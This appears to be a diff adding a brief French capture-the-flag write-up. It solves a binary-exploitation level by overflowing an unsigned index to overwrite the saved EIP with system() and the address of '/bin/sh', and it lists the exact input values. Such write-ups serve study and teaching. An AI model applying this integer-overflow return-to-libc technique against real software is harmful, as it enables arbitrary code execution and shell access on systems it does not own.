@@ -1,0 +1,17 @@
+pour bypass les storages reserves pour wil on fais un integer overflow sur un unsigned int ce qui nous permet d'ecrire ou on veut sur la stack
+
+du coup max unsigned int = 4294967296 il faut diviser tout ca par 4 car wil multiplie l'input * 4;
+result 1073741824 = au debut de l'array de stockage
+on sait que l'eip est stocker a l'indice 456 / 4 -> 114
+donc 1073741824 + 114 = 1073741938 = a notre eip
+on y stocke donc l'adresse de system
+il suffit ensuite de stocker l'adresse de /bin/sh a l'indice 116
+
+system dans eip 
+Number: 4159090384
+Index: 1073741938
+
+/bin/sh dans eip + 2
+Number: 4160264172
+Index: 116
+
